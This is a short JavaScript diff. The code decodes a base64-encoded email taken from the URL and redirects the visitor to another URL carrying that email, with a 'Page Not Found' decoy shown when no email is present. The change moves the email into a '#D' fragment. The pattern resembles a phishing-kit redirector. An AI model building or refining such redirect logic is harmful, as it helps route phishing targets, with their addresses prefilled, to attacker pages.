@@ -66,8 +66,8 @@ var email = parts[1];
 if (isBase64(email)) {
 email = atob(email);
 }
-email += 'D'; // Append 'D' to the decoded or plain email
-window.location.href = redirect_url + email; // Redirect to the new URL with the email
+// Redirect to the new URL with the email
+window.location.href = redirect_url + "#D" + email;
 } else {
 // No email found, show an error message
 alert('Page Not Found');
